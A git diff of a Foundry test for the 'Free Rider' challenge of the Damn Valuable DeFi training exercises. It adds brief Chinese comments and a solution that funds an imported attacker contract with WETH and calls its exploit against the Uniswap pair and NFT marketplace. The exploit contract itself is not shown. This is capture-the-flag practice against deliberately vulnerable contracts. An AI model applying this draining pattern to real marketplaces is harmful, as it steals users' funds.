@@ -11,6 +11,7 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import "./Attacker10.sol";
 
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -78,10 +79,12 @@ contract FreeRiderChallenge is Test {
 
         // Deploy the marketplace and get the associated ERC721 token
         // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
+        // 所有NFT的拥有者 = deployer
         marketplace = new FreeRiderNFTMarketplace{value: MARKETPLACE_INITIAL_ETH_BALANCE}(AMOUNT_OF_NFTS);
 
         // Get a reference to the deployed NFT contract. Then approve the marketplace to trade them.
         nft = marketplace.token();
+        // Approve给marketplace
         nft.setApprovalForAll(address(marketplace), true);
 
         // Open offers in the marketplace
@@ -123,7 +126,17 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        Attacker10 attacker = new Attacker10();
+    
+        weth.deposit{value: player.balance}();
+        weth.transfer(address(attacker), weth.balanceOf(player));
+
+        attacker.exploit(weth, uniswapPair, marketplace, address(nft), address(recoveryManager));
+        attacker.sendNFT(player);
+
+        weth.withdraw(weth.balanceOf(player));
+
+        console.log("player weth = ", weth.balanceOf(player));
     }
 
     /**
